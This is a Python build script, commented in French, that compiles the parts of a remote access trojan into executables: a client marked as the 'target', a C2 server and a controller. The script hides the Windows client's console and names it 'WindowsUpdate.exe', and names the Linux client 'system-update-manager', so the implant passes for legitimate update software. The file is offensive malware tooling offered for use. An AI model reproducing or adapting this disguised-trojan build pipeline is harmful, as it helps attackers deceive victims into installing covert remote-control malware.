import PyInstaller.__main__
import os
import platform


def compile_client():
    """Compile le client RAT en executable"""
    system = platform.system()

    if system == "Windows":
        PyInstaller.__main__.run([
            "client.py",
            "--onefile",
            "--noconsole",
            "--name=WindowsUpdate",
            "--clean"
        ])
        print("[+] Client Windows compilé: dist/WindowsUpdate.exe")

    else:
        PyInstaller.__main__.run([
            "client.py",
            "--onefile",
            "--name=system-update-manager",
            "--clean"
        ])
        print("[+] Client Linux compilé: dist/system-update-manager")


def compile_server():
    """Compile le serveur C2 en executable"""
    PyInstaller.__main__.run([
        "server.py",
        "--onefile",
        "--name=C2Server",
        "--clean"
    ])
    print("[+] Serveur C2 compilé: dist/C2Server")


def compile_controller():
    """Compile le controller en executable"""
    PyInstaller.__main__.run([
        "controller.py",
        "--onefile",
        "--name=Controller",
        "--clean"
    ])
    print("[+] Controller compilé: dist/Controller")


if __name__ == "__main__":
    import sys
    
    print("\n" + "="*50)
    print("COMPILATEUR RAT - Basic RAT Merged")
    print("="*50)
    print("\n1. Compiler Client (target)")
    print("2. Compiler Server (C2)")
    print("3. Compiler Controller (admin)")
    print("4. Compiler tout")
    print("5. Quitter")
    
    choice = input("\nChoisissez une option (1-5): ").strip()
    
    if choice == "1":
        compile_client()
    elif choice == "2":
        compile_server()
    elif choice == "3":
        compile_controller()
    elif choice == "4":
        print("\n[+] Compilation de tous les composants...")
        compile_client()
        compile_server()
        compile_controller()
        print("\n[+] ✅ Compilation terminée!")
    elif choice == "5":
        print("[+] Au revoir!")
        sys.exit(0)
    else:
        print("[-] Option invalide!")
